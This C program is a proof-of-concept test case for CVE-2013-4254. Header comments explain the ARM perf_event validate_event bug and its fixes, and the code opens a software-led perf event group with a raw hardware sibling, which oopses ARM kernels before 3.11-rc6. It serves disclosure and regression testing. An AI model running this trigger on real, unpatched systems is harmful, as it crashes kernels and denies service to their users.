/* arm_validate_event_oops */
/* Oopses the kernel on ARM and ARM64 from 3.2 until 3.11-rc6 */

/* by Vince Weaver <vincent.weaver _at_ maine.edu  */

/* This bug found via my perf_fuzzer tool */

/* It is fixed in 3.11-rc6 with c95eb3184ea1a3a25 */
/* Also the fix is in 3.10.8 and 3.4.59           */

/* This was likely introduced with Linux 3.2 with 8a16b34e2119       */

/* This causes an oops on a pandaboard on 3.11-rc4 */
/* The problem is in validate_event in  arch/arm/kernel/perf_event.c */
/*   If you have a group event where the leader is non-HW but the    */
/*   sibling is HW, validate_event treats the non-HW event as HW and */
/*   tries to call the ->get_event_idx() function which on non-HW    */
/*   is off the end of the structure and thus garbage.               */
/* For more info on this bug see the related (hard-to-trigger)       */
/*   exploit code in the exploits/ directory.                        */

/* It is assigned CVE-2013-4254 */

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/prctl.h>
#include "hw_breakpoint.h"
#include "perf_event.h"

int fd[1024];
struct perf_event_attr pe[1024];
char *mmap_result[1024];

int forked_pid;

int perf_event_open(struct perf_event_attr *hw_event_uptr,
	pid_t pid, int cpu, int group_fd, unsigned long flags) {

	return syscall(__NR_perf_event_open,hw_event_uptr, pid, cpu,
		group_fd, flags);
}

int main(int argc, char **argv) {

	printf("On ARM systems previous to 3.11-rc6 this test may oops the kernel.\n");

        memset(&pe[5],0,sizeof(struct perf_event_attr));
        pe[5].type=PERF_TYPE_SOFTWARE;
        pe[5].size=80;
        pe[5].config=PERF_COUNT_SW_TASK_CLOCK;
        pe[5].sample_type=0; /* 0 */
        pe[5].read_format=PERF_FORMAT_TOTAL_TIME_RUNNING|PERF_FORMAT_GROUP; /* \
a */
        pe[5].disabled=1;
	pe[5].exclusive=1;
        pe[5].exclude_user=1;
	pe[5].exclude_kernel=1;
        pe[5].mmap=1;
        pe[5].inherit_stat=1;
        pe[5].enable_on_exec=1;
        pe[5].watermark=1;
        pe[5].precise_ip=1; /* constant skid */
	pe[5].mmap_data=1;
        pe[5].sample_id_all=1;
        pe[5].exclude_guest=1;
	pe[5].wakeup_watermark=0;
        pe[5].bp_type=HW_BREAKPOINT_EMPTY;

        fd[5]=perf_event_open(&pe[5],0,0,-1,0 /*0*/ );

	memset(&pe[0],0,sizeof(struct perf_event_attr));
	pe[0].type=PERF_TYPE_RAW;
	pe[0].size=80;
	pe[0].config=0x8dfff7d3;
	pe[0].sample_type=0; /* 0 */
	pe[0].read_format=0x0ULL; /* 0 */
	pe[0].disabled=1;
	pe[0].inherit=1;
	pe[0].exclusive=1;
	pe[0].comm=1;
	pe[0].inherit_stat=1;
	pe[0].watermark=1;
	pe[0].precise_ip=2; /* request zero skid */
	pe[0].sample_id_all=1;
	pe[0].exclude_host=1;
	pe[0].exclude_guest=1;
	pe[0].wakeup_watermark=0;
	pe[0].bp_type=HW_BREAKPOINT_EMPTY;

	fd[0]=perf_event_open(&pe[0],0,0,fd[5],0 /*0*/ );

	return 0;
}
